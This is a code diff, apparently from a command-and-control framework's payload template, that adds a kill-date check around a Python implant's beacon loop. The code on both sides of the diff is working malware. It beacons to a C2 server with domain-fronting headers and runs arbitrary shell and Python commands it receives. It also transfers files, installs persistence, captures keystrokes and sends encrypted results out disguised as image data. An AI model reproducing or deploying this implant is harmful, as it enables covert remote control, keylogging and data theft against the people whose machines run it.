@@ -116,124 +116,125 @@ def decrypt_bytes_gzip( key, data):
   return data
 
 while(True):
-  # kill date stuff to add here
-  key = "%s"
-  uri = "%s"
-  serverclean = "%s"
-  server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
-  try:
-    time.sleep(timer)
-    ua='%s'
-    if hh: req=urllib2.Request(server,headers={'Host':hh,'User-agent':ua})
-    else: req=urllib2.Request(server,headers={'User-agent':ua})
-    res=urllib2.urlopen(req);
-    html = res.read()
-  except Exception as e:
-    E = e
-    #print "error %%s" %% e
-  #print html
-  if html:
+  cstr=time.strftime("%%d/%%m/%%Y",time.gmtime());cstr=time.strptime(cstr,"%%d/%%m/%%Y")
+  if cstr < kd:
+    key = "%s"
+    uri = "%s"
+    serverclean = "%s"
+    server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
     try:
-      returncmd = decrypt( key, html )
-      returncmd = returncmd.rstrip('\\0')
-
-      if "multicmd" in returncmd:
-
-        returncmd = returncmd.replace("multicmd","")
-        returnval = ""
-        split = returncmd.split("!d-3dion@LD!-d")
-
-        for cmd in split:
-          if cmd[:10] == "$sleeptime":
-            timer = int(cmd.replace("$sleeptime = ",""))
-          elif cmd[:13] == "download-file":  
-            fname = cmd.replace("download-file ","")
-            returnval = dfile(fname) 
-          elif cmd[:11] == "upload-file":  
-            fullparams = cmd.replace("upload-file ","")
-            params = fullparams.split(":")
-            returnval = ufile(params[1],params[0]) 
-          elif cmd[:19] == "install-persistence":  
-            returnval = persist() 
-          elif cmd[:14] == "get-keystrokes":  
-            returnval = keylog()
-          elif cmd[:18] == "remove-persistence":  
-            returnval = remove_persist() 
-          elif cmd[:19] == "startanotherimplant":   
-            returnval = sai(delfile=True)
-          elif cmd[:28] == "startanotherimplant-keepfile":
-            returnval = sai()  
-          elif cmd[:10] == "loadmodule":
-            module = cmd.replace("loadmodule","")
-            exec(module)
-            try:
-              import sys
-              import StringIO
-              import contextlib
-              
-              @contextlib.contextmanager
-              def stdoutIO(stdout=None):
-                old = sys.stdout
-                if stdout is None:
-                  stdout = StringIO.StringIO()
-                sys.stdout = stdout
-                yield stdout
-                sys.stdout = old
-
-              with stdoutIO() as s:
-                exec module
-              if s.getvalue():
-                returnval = s.getvalue()
-              else:
-                returnval = "Module loaded"
-            except Exception as e:
-              returnval = "Error with source file: %%s" %% e
-            
-          elif cmd[:6] == "python":
-            module = cmd.replace("python ","")            
-            try:
-              import sys
-              import StringIO
-              import contextlib
-              
-              @contextlib.contextmanager
-              def stdoutIO(stdout=None):
-                old = sys.stdout
-                if stdout is None:
-                  stdout = StringIO.StringIO()
-                sys.stdout = stdout
-                yield stdout
-                sys.stdout = old
-
-              with stdoutIO() as s:
-                exec module
-              
-              returnval = s.getvalue()
-
-            except Exception as e:
-              returnval = "Error with source file: %%s" %% e
-
-          else:
-            try:
-              returnval = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
-            except subprocess.CalledProcessError as exc:
-              returnval = "ErrorCmd: %%s" %% exc.output
-              
-          server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
-          opener = urllib2.build_opener()
-          postcookie = encrypt(key, cmd)
-          data = base64.b64decode(random.choice(icoimage))
-          dataimage = data.ljust( 1500, '\\0' )
-          dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
-          if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-          else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
-          res=urllib2.urlopen(req);
-          response = res.read()
-
+      time.sleep(timer)
+      ua='%s'
+      if hh: req=urllib2.Request(server,headers={'Host':hh,'User-agent':ua})
+      else: req=urllib2.Request(server,headers={'User-agent':ua})
+      res=urllib2.urlopen(req);
+      html = res.read()
     except Exception as e:
       E = e
       #print "error %%s" %% e
-      w = \"\"""" % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.ServerURL, self.UserAgent)
+    #print html
+    if html:
+      try:
+        returncmd = decrypt( key, html )
+        returncmd = returncmd.rstrip('\\0')
+  
+        if "multicmd" in returncmd:
+  
+          returncmd = returncmd.replace("multicmd","")
+          returnval = ""
+          split = returncmd.split("!d-3dion@LD!-d")
+  
+          for cmd in split:
+            if cmd[:10] == "$sleeptime":
+              timer = int(cmd.replace("$sleeptime = ",""))
+            elif cmd[:13] == "download-file":  
+              fname = cmd.replace("download-file ","")
+              returnval = dfile(fname) 
+            elif cmd[:11] == "upload-file":  
+              fullparams = cmd.replace("upload-file ","")
+              params = fullparams.split(":")
+              returnval = ufile(params[1],params[0]) 
+            elif cmd[:19] == "install-persistence":  
+              returnval = persist() 
+            elif cmd[:14] == "get-keystrokes":  
+              returnval = keylog()
+            elif cmd[:18] == "remove-persistence":  
+              returnval = remove_persist() 
+            elif cmd[:19] == "startanotherimplant":   
+              returnval = sai(delfile=True)
+            elif cmd[:28] == "startanotherimplant-keepfile":
+              returnval = sai()  
+            elif cmd[:10] == "loadmodule":
+              module = cmd.replace("loadmodule","")
+              exec(module)
+              try:
+                import sys
+                import StringIO
+                import contextlib
+                
+                @contextlib.contextmanager
+                def stdoutIO(stdout=None):
+                  old = sys.stdout
+                  if stdout is None:
+                    stdout = StringIO.StringIO()
+                  sys.stdout = stdout
+                  yield stdout
+                  sys.stdout = old
+  
+                with stdoutIO() as s:
+                  exec module
+                if s.getvalue():
+                  returnval = s.getvalue()
+                else:
+                  returnval = "Module loaded"
+              except Exception as e:
+                returnval = "Error with source file: %%s" %% e
+              
+            elif cmd[:6] == "python":
+              module = cmd.replace("python ","")            
+              try:
+                import sys
+                import StringIO
+                import contextlib
+                
+                @contextlib.contextmanager
+                def stdoutIO(stdout=None):
+                  old = sys.stdout
+                  if stdout is None:
+                    stdout = StringIO.StringIO()
+                  sys.stdout = stdout
+                  yield stdout
+                  sys.stdout = old
+  
+                with stdoutIO() as s:
+                  exec module
+                
+                returnval = s.getvalue()
+  
+              except Exception as e:
+                returnval = "Error with source file: %%s" %% e
+  
+            else:
+              try:
+                returnval = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
+              except subprocess.CalledProcessError as exc:
+                returnval = "ErrorCmd: %%s" %% exc.output
+                
+            server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
+            opener = urllib2.build_opener()
+            postcookie = encrypt(key, cmd)
+            data = base64.b64decode(random.choice(icoimage))
+            dataimage = data.ljust( 1500, '\\0' )
+            dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
+            if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+            else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+            res=urllib2.urlopen(req);
+            response = res.read()
+
+      except Exception as e:
+        E = e
+        #print "error %%s" %% e
+        w = \"\"""" % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.ServerURL, self.UserAgent)
     self.C2Core = """
 $key="%s"
 $global:sleeptime = '%s'
